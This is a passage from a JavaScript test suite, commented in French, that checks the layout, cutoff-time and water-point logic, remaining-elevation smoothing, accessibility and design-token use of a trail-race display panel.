  const bloc = codeSeul(lire('src/ui/course-bar.css')).match(/\.cb-title\s*\{[^}]*\}/s)[0]
  assert.match(bloc, /font-size:\s*var\(--ce-t-title\)/)
  // et il absorbe seul le manque de place : les chiffres ne se font plus
  // trancher en plein glyphe
  const css = codeSeul(lire('src/ui/course-bar.css'))
  const chiffres = css.match(/\.cb-chiffres\s*\{[^}]*\}/s)[0]
  assert.match(chiffres, /flex:\s*none/, '.cb-chiffres ne doit plus rétrécir')
  assert.ok(!/overflow:\s*hidden/.test(chiffres), '.cb-chiffres n’a plus rien à cacher')
})

test('sur écran court, le kilométrage garde toujours un porteur', () => {
  // .cc-km n'existe QUE pour le cas « profil disparu » (sous 680 px de large),
  // mais la media query max-height:520 masquait .cc-head EN BLOC — or .cc-km
  // vit dedans. Sur 667×375 (iPhone SE en paysage, l'orientation naturelle de
  // ce mode) les deux conditions étaient vraies : ni profil, ni pastille, ni
  // km. Le commentaire de carnet-course.css devenait faux exactement dans le
  // cas qu'il décrit.
  const css = codeSeul(lire('src/ui/course-bar.css'))
  const court = css.slice(css.indexOf('@media (max-height: 520px)'))
  assert.ok(!/@media \(max-height: 520px\)\s*\{[^@]*\.cb-bar \.cc-head\s*\{[^}]*display:\s*none/s.test(court),
    'la media query de hauteur seule ne doit pas masquer .cc-head')
  // le masquage de .cc-head est conditionné à la PRÉSENCE du profil
  assert.match(css, /@media \(min-width: 681px\) and \(max-height: 520px\)[\s\S]*?cc-head[^}]*display:\s*none/)
  // et quand le profil n'est pas là, la barre rend les 21 px au lieu de rogner
  assert.match(css, /@media \(max-width: 680px\) and \(max-height: 520px\)[\s\S]*?--cb-body-h/)
})

// ============================ 8. la barrière : « la prochaine », pas « celle
//                                  du point suivant, s'il en a une »
test('la barrière annoncée est la PREMIÈRE devant, pas celle du point suivant', () => {
  // `cutoff` est un champ LIBRE saisi point par point (ui/studio.js,
  // race-model.js) : sur un trail réel, trois points sur douze en portent une.
  // En ne regardant que le point immédiatement devant, la rangée était
  // démontée pendant les 80 % du temps où le coureur a justement besoin de
  // savoir combien de marge il lui reste — et le panneau était MUET sur la
  // seule donnée du modèle qui puisse mettre hors course.
  const wp = [
    { km: 2, name: 'Col', pictos: [] }, // pas de barrière ici
    { km: 3, name: 'Fontaine', pictos: [] },
    { km: 4, name: 'Base de vie', pictos: [], cutoff: '12h30' },
  ]
  const c = carnetALaLigne({ cumKm, eles, waypoints: wp }, 1) // km 1 → suivant = Col
  assert.equal(c.pointSuivant, 'Col')
  assert.equal(c.cutoffSuivant, null, 'le point suivant n’a pas de barrière')
  assert.equal(c.cutoffProchain, '12h30', 'la première barrière devant doit être trouvée')
  assert.equal(c.kmBarriere, 4)
  const t = textesDuCarnet(c)
  assert.equal(t.aBarriere, true, 'la rangée doit rester montée entre deux barrières')
  assert.equal(t.barriere, '12h30')
  // ⚠️ UNE HEURE SANS LIEU NE DÉSIGNE RIEN : l'ancrage part avec elle
  assert.equal(t.barriereOu, 'km 4')
  assert.match(phraseDuCarnet(c), /barrière horaire 12h30 au km 4/)
  // et la fonction pure sait dire non
  assert.equal(prochaineBarriere(wp, 4.5), null, 'plus rien devant')
  assert.equal(prochaineBarriere(null, 0), null)
})

test('le ROUGE de la barrière est un état, pas une couleur de rangée', () => {
  // `.cc-v-limite` était posée une fois pour toutes à la construction : dès
  // qu'un cutoff existait, le chiffre était rouge — c'est-à-dire toujours, pour
  // une course qui en a. Un rouge qui est toujours rouge n'est pas une alerte,
  // et c'était la SEULE teinte sémantique du panneau.
  const loin = [{ km: 2, name: 'Col', pictos: [] }, { km: 4, name: 'Base', pictos: [], cutoff: '12h30' }]
  assert.equal(textesDuCarnet(carnetALaLigne({ cumKm, eles, waypoints: loin }, 1)).barriereImminente, false)
  const proche = [{ km: 4, name: 'Base', pictos: [], cutoff: '12h30' }]
  assert.equal(textesDuCarnet(carnetALaLigne({ cumKm, eles, waypoints: proche }, 1)).barriereImminente, true)
  // et c'est bien le JS qui pose la classe, plus la feuille
  const ui = codeSeul(lire('src/ui/carnet-course.js'))
  assert.match(ui, /classList\.toggle\('cc-v-limite', t\.barriereImminente\)/)
  // ⚠️ ET LA RÈGLE D'ÉTAT VIT APRÈS LA RÈGLE DE BASE. L'élément porte les deux
  // classes et les deux sélecteurs ont la même spécificité : déclarée AVANT
  // `.cc-v { color: var(--ce-ink) }`, la teinte d'alerte était écrasée en
  // silence — la barrière n'a jamais été rouge, pas « toujours rouge ».
  const css = codeSeul(lire('src/ui/carnet-course.css'))
  assert.ok(css.indexOf('.cc-v-limite') > css.indexOf('.cc-v {'),
    '.cc-v-limite déclarée avant .cc-v : le navigateur l’écrase en silence')
})

test('un point de passage SANS NOM ne fait plus disparaître sa barrière', () => {
  // tout le bloc du bas était piloté par le NOM (`!!c.pointSuivant`), or
  // parseRace accepte `name: String(w.name || '')` et le studio CRÉE les points
  // ainsi (`waypoints.push({ km: 0, name: '', … })`). Un point sans nom mais
  // avec barrière effaçait le bloc, pictos compris — pendant que le cartouche
  // 3D du MÊME point, lui, affichait la barrière.
  const t = textesDuCarnet(carnetALaLigne({ cumKm, eles, waypoints: [{ km: 4, name: '', cutoff: '12h30', pictos: [] }] }, 1))
  assert.equal(t.aBarriere, true)
  assert.equal(t.aSuivant, true, 'le point existe, c’est son nom qui manque')
  assert.ok(t.prochainNom.length > 0, 'un libellé de repli, pas un bloc effacé')
  assert.ok(!t.prochainNom.includes('undefined'))
})

test('une barrière trop longue est bornée AVANT d’atteindre l’écran', () => {
  // `cutoff: String(w.cutoff || '')` n'impose aucune longueur et le studio
  // l'expose en <input> libre : « dim. 12h30 (stricte) » se faisait trancher au
  // glyphe et se lisait « dim. 12h30 (str » — une heure qui a l'air valide et
  // qui ne l'est pas.
  const long = 'x'.repeat(60)
  const t = textesDuCarnet(carnetALaLigne({ cumKm, eles, waypoints: [{ km: 4, name: 'Base', pictos: [], cutoff: long }] }, 1))
  assert.ok(t.barriere.length <= 14, `barrière de ${t.barriere.length} caractères`)
  // et le CSS met le filet : la valeur doit pouvoir rétrécir et s'ellipser
  const bloc = codeSeul(lire('src/ui/carnet-course.css')).match(/\.cc-v\s*\{[^}]*\}/s)[0]
  assert.match(bloc, /min-width:\s*0/)
  assert.match(bloc, /text-overflow:\s*ellipsis/)
})

// ================================ 9. « le prochain point qui a X », pas « le X
//                                     du prochain point »
test('l’eau se voit même quand elle est deux points plus loin', () => {
  // le raisonnement du dépôt — annoncer l'eau de loin, parce que c'est ce qui
  // décide combien on boit MAINTENANT — n'était servi qu'un point à la fois :
  // si le point suivant est un col et le ravito deux points plus loin, le
  // panneau n'annonçait l'eau nulle part.
  const wp = [
    { km: 2, name: 'Col', pictos: ['col'] },
    { km: 4, name: 'Base', pictos: ['eau', 'ravito'] },
  ]
  const c = carnetALaLigne({ cumKm, eles, waypoints: wp }, 1)
  const cles = c.pictos.map((p) => p.picto)
  assert.ok(cles.includes('col'), 'les pictos du point suivant restent')
  assert.ok(cles.includes('eau'), 'le prochain point porteur d’eau doit apparaître')
  const emprunte = c.pictos.find((p) => p.picto === 'eau')
  assert.equal(emprunte.km, 4, 'un picto emprunté DOIT dire où il est')
  assert.equal(emprunte.loin, true)
  // et on n'emprunte rien quand le point suivant a déjà de quoi boire
  const proche = carnetALaLigne({ cumKm, eles, waypoints: [{ km: 2, name: 'Ravito', pictos: ['eau'] }, { km: 4, name: 'Base', pictos: ['ravito'] }] }, 1)
  assert.equal(proche.pictos.length, 1, 'pas de doublon quand le suivant suffit')
  assert.equal(prochainRavitaillement(wp, 4.5), null)
})

// ============================ 10. la durée : une soustraction, pas un ETA
test('parseGpx garde le <time> de chaque point, et le carnet en tire une durée', () => {
  // parseGpx lisait lat/lon/ele et JETAIT le <time>, présent dans la quasi
  // -totalité des GPX sortis d'une montre. Le carnet déclarait alors dans ses
  // commentaires qu'aucune durée n'était calculable : vrai de ce que le modèle
  // CONTENAIT, faux de ce qu'il pouvait contenir.
  const gpx = codeSeul(lire('src/gpx.js'))
  assert.match(gpx, /querySelector\('time'\)/, 'le <time> doit être lu')
  assert.match(gpx, /Number\.isFinite\(t\) \? t : null/, 'garde de finitude, convention du fichier')
  // et c'est une SOUSTRACTION, pas une extrapolation : deux horodatages suffisent
  const pts = [{ t: 0 }, { t: 600000 }, { t: 1800000 }, { t: 3600000 }, { t: 5400000 }, { t: 7200000 }]
  assert.equal(dureeRestante(pts, 0), 7200000)
  assert.equal(dureeRestante(pts, 2), 5400000)
  assert.equal(dureeRestante(pts, 5), null, 'à l’arrivée, plus de durée')
  // pas de <time> (parcours dessiné à la main) → rien, jamais un zéro déguisé
  assert.equal(dureeRestante([{ t: null }, { t: null }], 0), null)
  assert.equal(dureeRestante(null, 0), null)
  const t = textesDuCarnet(carnetALaLigne({ cumKm, eles, waypoints: [], trkPoints: pts }, 0))
  assert.equal(t.duree, '2 h 00 sur la trace', `reçu « ${t.duree} »`)
  // ⚠️ LA SOURCE EST DITE DANS LE MÊME SOUFFLE : sans « sur la trace », un
  // coureur lirait un ETA personnel que rien dans le modèle ne permet
  assert.match(t.duree, /sur la trace$/)
  assert.equal(textesDuCarnet(carnetALaLigne({ cumKm, eles, waypoints: [] }, 0)).duree, '')
})

// ================================ 11. ce qui ne bouge plus, et ce qui bouge
test('le chiffre héros ne saute plus quand une rangée apparaît', () => {
  // la barre avait une hauteur fixe, mais son CONTENU se recentrait : avec
  // justify-content:center et des rangées démontées par `hidden`, l'apparition
  // de la barrière (23 px) ou le passage du bloc « prochain point » (44,6 px) à
  // Sommet/Altitude faisaient sauter le chiffre de 34 px de 11 puis de 15 px.
  const css = codeSeul(lire('src/ui/carnet-course.css'))
  const side = css.match(/\.cc-side\s*\{[^}]*\}/s)[0]
  const m = /min-height:\s*(\d+)px/.exec(side)
  assert.ok(m, '.cc-side doit être ancrée à la hauteur du pire cas')
  // le pire cas compté en tête de fichier : 17 + 6 + 17 + 6 + 44,6 = 90,6
  assert.ok(parseInt(m[1], 10) >= 91, `min-height ${m?.[1]} sous le pire cas`)
  assert.match(side, /align-content:\s*start/, 'la place réservée reste en bas')
})

test('le D+ RESTANT ne remonte pas d’une image à l’autre', () => {
  // ascentStats() applique une hystérésis dont le résultat DÉPEND du point de
  // départ (race-model.js le dit) : le D+ restant n'est donc pas monotone en
  // `idx` et peut osciller de quelques mètres. Le lisser le laisserait remonter
  // — on force la décroissance, qui est la vérité physique.
  assert.equal(decroissant(NaN, 1200), 1200, 'première image : on accepte')
  assert.equal(decroissant(1200, 1180), 1180)
  assert.equal(decroissant(1180, 1195), 1180, 'un D+ restant ne remonte pas')
  assert.equal(decroissant(1180, NaN), NaN)
  const main = lire('src/main.js')
  assert.match(main, /decroissant\(_dplusVu, _carnetLisse\.dplusRestant\)/)
  // et le commentaire ne justifie plus une décision par un champ mort : aucun
  // objet rendu par carnetALaLigne() n'a jamais eu de champ nommé `dplus`
  assert.ok(!/`dplus` repart à 0 à chaque point franchi/.test(main))
})

test('le D− RESTANT ne remonte pas non plus — MÊME appel ascentStats, MÊME défaut', () => {
  // ⚠️ CE TEST EXISTE PARCE QUE LE PREMIER N'ÉTAIT PAS ASSEZ. deniveleRestant()
  // tire `dplus` ET `dminus` du MÊME `ascentStats(eles, { debut: idx })`
  // (carnet-course.js) : l'hystérésis qui rend `dplusRestant` non monotone en
  // `idx` (voir le test précédent) s'applique À L'IDENTIQUE à `dMoinsRestant`.
  // Renommer « Sommet restant » en « D− restant » sans étendre la même
  // protection aurait remplacé un mensonge (une altitude sous un libellé de
  // dénivelé) par un autre plus discret (un dénivelé qui remonte de temps en
  // temps pendant une lecture qui avance).
  //
  // Profil qui fait RÉELLEMENT osciller le dminus BRUT (pas un cas fabriqué à
  // la main sans rapport avec le code réel — trouvé en balayant ascentStats
  // avec des profils aléatoires jusqu'à ce qu'un `idx` produise un dminus
  // PLUS GRAND que celui d'un `idx` précédent) :
  const dents = [0, 1, 2, 3, 4, 5, 6]
  const profil = [1000, 1006, 1007, 999, 992, 986, 978]
  const brut = dents.map((_, i) => deniveleRestant(dents, profil, i, []).dMoinsRestant)
  assert.deepEqual(brut, [22, 28, 29, 21, 14, 8, 0],
    `le dminus BRUT doit bien osciller (22→28→29) pour que ce test prouve quelque chose : ${brut}`)
  assert.ok(brut[1] > brut[0], 'la valeur brute REMONTE bien en idx=1 : c’est le défaut à corriger')
  // ⚠️ ET C'EST ICI QUE LA PROTECTION DOIT AGIR, SUR TOUTE UNE LECTURE — pas
  // seulement sur deux valeurs isolées. On rejoue exactement l'algorithme de
  // `main.js` (onHoverIndex) : un plancher qui part de `null` (première image
  // : on accepte) puis ne fait que décroître, image après image.
  let plancher = null
  const lisse = brut.map((v) => { plancher = decroissant(plancher, v); return plancher })
  assert.deepEqual(lisse, [22, 22, 22, 21, 14, 8, 0])
  for (let i = 1; i < lisse.length; i++) {
    assert.ok(lisse[i] <= lisse[i - 1], `D− restant lissé a remonté à l'index ${i} : ${lisse[i - 1]} → ${lisse[i]}`)
  }
  // et la protection est bien CÂBLÉE dans main.js, pas seulement démontrée
  // ici dans l'abstrait : même mécanique que _dplusVu, sur son propre état.
  const main = lire('src/main.js')
  assert.match(main, /decroissant\(_dMoinsVu, _carnetLisse\.dMoinsRestant\)/)
  // les deux planchers se réarment sur la MÊME tête de lecture qui recule —
  // pas deux horloges indépendantes qui pourraient dériver l'une de l'autre
  assert.match(main, /if \(i <= _restIdx\) \{ _dplusVu = null; _dMoinsVu = null \}/)
})

test('rien n’est calculé à 60 im/s pour être jeté', () => {
  // penteClasse était recalculé à chaque image puis reconduit par
  // textesDuCarnet, et consommé NULLE PART : le rendu colore sa bande depuis
  // fenetrePentes[].classe et la phrase lue n'utilise que `pente`.
  const src = codeSeul(lire('src/carnet-course.js'))
  assert.ok(!/penteClasse/.test(src), 'penteClasse est calculé puis jeté')
  const t = textesDuCarnet(carnetALaLigne({ cumKm, eles, waypoints: [] }, 1))
  assert.equal(t.penteClasse, undefined)
  // et les formateurs Intl sont hissés : textesDuCarnet est appelé sans
  // condition par update(), donc soixante fois par seconde
  assert.match(src, /const FMT1 = new Intl\.NumberFormat/)
  assert.match(src, /const FMT0 = new Intl\.NumberFormat/)
  const corps = src.slice(src.indexOf('export function textesDuCarnet'))
  assert.ok(!/toLocaleString/.test(corps), 'plus un seul Intl reconstruit par appel')
})

// ================================ 12. l'ordre, à l'œil comme à la voix
test('le terrain à venir passe APRÈS la distance restante, partout', () => {
  // la bande de pente — rang 5 — était le deuxième enfant de .cc-body, donc
  // au-dessus du chiffre héros : un coureur qui balaie le panneau de haut en
  // bas rencontrait le terrain avant la distance restante, et l'arbre
  // d'accessibilité disait la même chose que l'œil.
  const ui = codeSeul(lire('src/ui/carnet-course.js'))
  assert.ok(ui.indexOf("el('div', 'cc-main', root)") < ui.indexOf("el('div', 'cc-slope-wrap', root)"),
    'la bande doit être créée après le bloc principal')
  // et la voix suit le même ordre : la pente est avant-dernière
  const p = phraseDuCarnet(carnetALaLigne({ cumKm, eles, waypoints: [{ km: 4, name: 'Col', pictos: [], cutoff: '12h30' }] }, 1))
  assert.ok(p.indexOf('Col') < p.indexOf('pente'), `la pente doit suivre le prochain point : ${p}`)
  assert.ok(p.indexOf('pente') < p.indexOf('barrière'), `la barrière reste la dernière : ${p}`)
})

// ================================ 13. accessibilité et tactile, encore
test('replier la barre coupe les pixels, pas la voix', () => {
  // le repli pose `bodyEl.inert` et `visibility: hidden` sur .cb-body : la
  // région live, construite DANS .cc-body, sortait de l'arbre d'accessibilité
  // à chaque repli — un geste purement visuel éteignait le seul canal non
  // visuel de la fonctionnalité, pendant qu'update() continuait d'y écrire.
  const cb = lire('src/ui/course-bar.js')
  const gabarit = cb.slice(cb.indexOf('bar.innerHTML = `'), cb.indexOf('container.appendChild(bar)'))
  assert.match(gabarit, /class="cc-sr" id="cb-sr"/, 'la région live vit dans la barre')
  assert.ok(gabarit.indexOf('cb-sr') > gabarit.indexOf('</div>'), 'hors du corps repliable')
  assert.match(cb, /srNode: bar\.querySelector\('#cb-sr'\)/)
  const ui = codeSeul(lire('src/ui/carnet-course.js'))
  assert.match(ui, /buildCarnetCourse\(\{ container, srNode = null \}\)/)
})

test('la tête de barre survit à la branche tactile du système', () => {
  // v28.css @media (pointer: coarse) porte .ce-icon-btn à 44×44 et .ce-btn à
  // 34 : la tête, bloquée en `height: 40px` (32 sur écran court), les faisait
  // déborder par-dessus le filet et le sommet du profil. Le test WCAG existant
  // ne lit que les déclarations de BASE de v28.css et n'entre jamais ici.
  const v28 = codeSeul(lire('src/ui/v28.css'))
  const coarse = v28.slice(v28.indexOf('@media (pointer: coarse)'))
  const cible = parseInt(/\.ce-icon-btn\s*\{[^}]*height:\s*(\d+)px/s.exec(coarse)[1], 10)
  assert.ok(cible >= 44, `cible tactile ${cible} px`)
  const css = codeSeul(lire('src/ui/course-bar.css'))
  // plus aucune hauteur FIGÉE sur la tête : elle n'a pas à être plus rigide
  // que la barre
  for (const m of css.matchAll(/\.cb-head\s*\{([^}]*)\}/g)) {
    assert.ok(!/(^|[^-])\bheight:/.test(m[1]), `.cb-head fige sa hauteur : ${m[1].trim()}`)
  }
  // et la hauteur tactile est DÉCIDÉE, pas subie
  const bloc = css.match(/@media \(pointer: coarse\)\s*\{[^}]*\.cb-head\s*\{[^}]*min-height:\s*(\d+)px/s)
  assert.ok(bloc, 'aucun bloc coarse pour .cb-head dans course-bar.css')
  assert.ok(parseInt(bloc[1], 10) >= cible, `tête de ${bloc[1]} px pour un bouton de ${cible}`)
})

// ================================ 14. le système, vraiment adopté
test('la barre porte le verre du système, pas une copie qui a dérivé', () => {
  // les cinq propriétés de .ce-glassbox étaient recopiées dans .cb-bar, et deux
  // avaient dérivé : blur(22px) saturate(1.6) contre blur(20px) saturate(1.5).
  // C'est le péché que ce fichier condamne pour les trois boutons, commis un
  // cran au-dessus — et visible dans la même image, puisque le panneau de
  // profil qu'elle héberge porte, lui, .ce-glassbox.
  assert.match(lire('src/ui/course-bar.js'), /cb-bar ce-glassbox/)
  const css = codeSeul(lire('src/ui/course-bar.css'))
  const bloc = css.match(/\.cb-bar\s*\{[^}]*\}/s)[0]
  for (const prop of ['backdrop-filter', 'box-shadow', 'border:']) {
    assert.ok(!bloc.includes(prop), `.cb-bar redéclare ${prop} du système`)
  }
  // une seule différence, décidée — et qualifiée, parce que cette feuille est
  // évaluée AVANT v28.css
  assert.match(css, /\.cb-bar\.ce-glassbox\s*\{[^}]*--ce-glass-strong/s)
})

test('les libellés de contrôle passent par un palier, pas par des pixels', () => {
  // .ce-btn était à 12 px et .ce-seg-btn à 11,5 px : deux valeurs pour un seul
  // rôle, dans aucun palier, pendant que l'en-tête de course-bar.css jurait
  // « uniquement les paliers --ce-t-* ». La barre rendait 11 / 11,5 / 12 / 13 /
  // 17 / 22 / 34 — la « flaque » de v28.css reconstituée par un autre chemin.
  const v28 = lire('src/ui/v28.css')
  assert.match(v28, /--ce-t-control:\s*\d+px/, 'le palier doit être déclaré')
  for (const sel of ['.ce-btn', '.ce-seg-btn']) {
    const bloc = codeSeul(v28).match(new RegExp(`\\${sel}\\s*\\{[^}]*\\}`, 's'))[0]
    assert.match(bloc, /font-size:\s*var\(--ce-t-control\)/, `${sel} garde une taille en dur`)
  }
  // et l'encre des vitesses inactives rejoint celle du chevron et des caméras
  assert.match(codeSeul(lire('src/ui/course-bar.css')),
    /\.cb-bar \.cb-speed-btn:not\(\.on\)\s*\{[^}]*--ce-muted-fort/s)
})

test('les chiffres FIGÉS de la tête cèdent un palier aux chiffres VIVANTS', () => {
  // quatre chiffres figés à 17 px contre deux chiffres vivants à 17 px, les
  // figés PLUS HAUT dans la page : la hiérarchie typographique disait qu'ils
  // comptent autant. Pour un coureur en course, le D+ total est la donnée la
  // moins actionnable de la barre.
  const cb = codeSeul(lire('src/ui/course-bar.css'))
  const dd = cb.match(/\.cb-chiffre dd\s*\{[^}]*\}/s)[0]
  assert.match(dd, /font-size:\s*var\(--ce-t-body\)/)
  const cc = codeSeul(lire('src/ui/carnet-course.css'))
  assert.match(cc.match(/\.cc-v\s*\{[^}]*\}/s)[0], /font-size:\s*var\(--ce-t-num\)/)
  const v28 = lire('src/ui/v28.css')
  const t = (nom) => parseInt(new RegExp(`--ce-t-${nom}:\\s*(\\d+)px`).exec(v28)[1], 10)
  assert.ok(t('num') > t('body'), 'le vivant doit dominer le figé')
  // et la tête aligne enfin ses deux groupes sur UNE ligne de base
  assert.match(cb.match(/\.cb-head\s*\{[^}]*\}/s)[0], /align-items:\s*baseline/)
  assert.match(cb.match(/\.cb-head-actions\s*\{[^}]*\}/s)[0], /align-self:\s*center/)
})

test('« Sommet restant » est devenu « D− restant », et son signe est le vrai moins', () => {
  // AVANT : la tête affichait altMax (tout le parcours, figé) sous « SOMMET »,
  // la colonne affichait aussi « SOMMET » pour le point culminant RESTANT
  // (vivant) : au-dessus de 1101 px un coureur lisait « SOMMET 1840 m » à
  // gauche et « SOMMET 1450 m » à droite, même libellé, même taille — la
  // répétition que la demande n°7 condamnait. Le renommage en « D− restant »
  // règle la collision de mot EN MÊME TEMPS qu'il corrige la donnée en
  // dessous (voir le test précédent) : il n'y a plus de mot commun entre la
  // tête et la colonne.
  const ui = codeSeul(lire('src/ui/carnet-course.js'))
  assert.match(ui, /duo\('D−', \{ suffixe: 'restant'/, 'le carnet doit dire « D− restant »')
  assert.ok(!/duo\('Sommet'/.test(ui), '« Sommet » ne doit plus être un libellé du carnet')
  // ⚠️ LE VRAI SIGNE MOINS (U+2212), PAS UN TRAIT D'UNION. Le carnet écrit
  // déjà « D+ » avec un vrai plus ; un « D-» au trait d'union ferait un
  // couple bancal à l'œil à côté de lui.
  assert.ok(ui.includes("duo('D−'"), 'le signe doit être U+2212 (moins mathématique)')
  assert.ok(!ui.includes("duo('D-'"), 'pas un trait d’union à la place du signe moins')
  const css = codeSeul(lire('src/ui/carnet-course.css'))
  // le suffixe garde le même palier de largeur qu'avant (voir la note de
  // carnet-course.css : ce n'est plus une histoire de collision de mot avec la
  // tête, seulement un arbitrage de budget de largeur)
  assert.match(css, /@media \(min-width: 1101px\)[\s\S]*?cc-stat-dmoins \.cc-l-suf[^}]*display:\s*inline/)
  // la tête, elle, garde son « SOMMET » (altMax, tout le parcours) — c'est un
  // chiffre différent qui n'a plus besoin de bouger pour cette tâche
  assert.match(codeSeul(lire('src/ui/course-bar.css')),
    /@media \(max-width: 1100px\)[\s\S]*?cb-chiffre-sommet[^}]*display:\s*none/)
})

test('la colonne de droite a un budget de LARGEUR, et il est écrit', () => {
  // le budget de HAUTEUR était compté ligne par ligne depuis le début ; celui
  // de largeur n'existait nulle part et ne passait pas : à 236 px de basis
  // (tablette en portrait) la rangée « D+ RESTANT · 1 840 m » s'écrasait
  // jusqu'à « D… ». Sous 680 px la zone s'étire et le problème disparaissait —
  // c'est donc la tablette, pas le téléphone, qui était le cas cassé.
  const css = lire('src/ui/carnet-course.css')
  assert.match(css, /BUDGET DE LARGEUR/, 'l’addition doit être écrite, comme celle des hauteurs')
  const cb = codeSeul(lire('src/ui/course-bar.css'))
  const base = (bloc) => parseInt(/flex(?:-basis)?:\s*(?:0 0 )?(\d+)px/.exec(bloc)[1], 10)
  const large = base(cb.match(/\.cb-zone-carnet\s*\{[^}]*\}/s)[0])
  const moyen = base(cb.match(/@media \(max-width: 1100px\)\s*\{[\s\S]*?\.cb-zone-carnet\s*\{[^}]*\}/s)[0])
  const etroit = base(cb.match(/@media \(max-width: 900px\)\s*\{[\s\S]*?\.cb-zone-carnet\s*\{[^}]*\}/s)[0])
  assert.ok(large >= 340, `zone carnet à ${large} px : le budget ne passe pas`)
  assert.ok(moyen >= 316 && moyen < large, `${moyen} px au palier 1100`)
  assert.ok(etroit >= 280 && etroit < moyen, `${etroit} px au palier 900`)
  // et les valeurs s'alignent enfin en COLONNE : c'était le bord droit du bloc
  // valeur — donc l'unité — qui s'alignait, pas le chiffre
  const side = codeSeul(css).match(/\.cc-side\s*\{[^}]*\}/s)[0]
  assert.match(side, /display:\s*grid/)
  assert.match(side, /grid-template-columns:\s*minmax\(0, 1fr\) auto auto/)
})

test('la garde d’égalité des boutons caméra existe, et le focus est rapatrié', () => {
  // syncCamAvailable est appelé par tick(), donc à chaque image de la boucle de
  // rendu : on réécrivait `disabled` sur six boutons soixante fois par seconde,
  // sans garde — alors que syncPlay, deux blocs plus bas, en a une. Et si le
  // rig se désactive pendant qu'un bouton caméra a le focus, `disabled = true`
  // fait retomber le focus sur <body>.
  const js = lire('src/ui/course-bar.js')
  const bloc = js.slice(js.indexOf('function syncCamAvailable()'), js.indexOf('playBtn.addEventListener'))
  assert.match(bloc, /if \(_camVu === off\) return/)
  assert.match(bloc, /camEl\.contains\(document\.activeElement\)/)
  const show = js.slice(js.indexOf('function show()'), js.indexOf('function hide()'))
  assert.match(show, /_camVu = null/, 'la garde doit être réarmée à l’entrée')
})

test('aucune couleur en dur dans les deux feuilles de la barre course', () => {
  // le seul point que les trois critiques ont trouvé irréprochable : le mode
  // sombre est correct PAR CONSTRUCTION. Ce test est là pour qu'il le reste.
  for (const f of ['src/ui/course-bar.css', 'src/ui/carnet-course.css']) {
    const css = codeSeul(lire(f))
    assert.ok(!/#[0-9a-fA-F]{3,8}\b/.test(css), `${f} : couleur hexadécimale en dur`)
    assert.ok(!/\brgba?\(/.test(css), `${f} : couleur rgb() en dur`)
  }
})
